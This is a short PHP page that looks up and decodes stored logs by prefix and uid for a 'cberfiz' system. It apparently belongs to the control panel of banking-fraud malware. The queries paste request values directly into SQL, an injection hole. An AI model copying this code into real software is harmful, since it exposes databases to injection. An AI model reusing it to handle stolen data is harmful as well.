<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

$gen = true;

if($_SESSION['user']->config['infoacc'] == '1'){
    if($_SESSION['user']->config['systems']['cberfiz'] != true){
        $gen = false;
        header('Location: /logs/');
        exit;
    }
}

if(!empty($Cur['str']) && $gen == true){
    $matches = explode('0', $Cur['str'], 2);
    if(!empty($matches[0]) && !empty($matches[1])){
        $prefix = $matches[0];
        $uid = '0' . $matches[1];
    }
    
    if(!empty($_SESSION['user']->config['userid'])){
        $log = $mysqli->query('SELECT * from bf_log_info WHERE (userid = \''.$_SESSION['user']->config['userid'].'\') AND (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (system = \'cberfiz\') LIMIT 1');
    }else{
        $log = $mysqli->query('SELECT * from bf_log_info WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (system = \'cberfiz\') LIMIT 1');
    }
    
    if($log->prefix == $prefix && $log->uid == $uid){
        if(!empty($log->log)){
            $log->log = base64_decode($log->log);
            if(!empty($log->log)){
                $log->log = gzinflate($log->log);
                if($log->log != false){
                    $log->log = json_decode($log->log, true);
                }
            }
        }
        //print_rm($log->log['depo']);
        $smarty->assign('log', $log);
    }else{
        exit;
    }
}

?>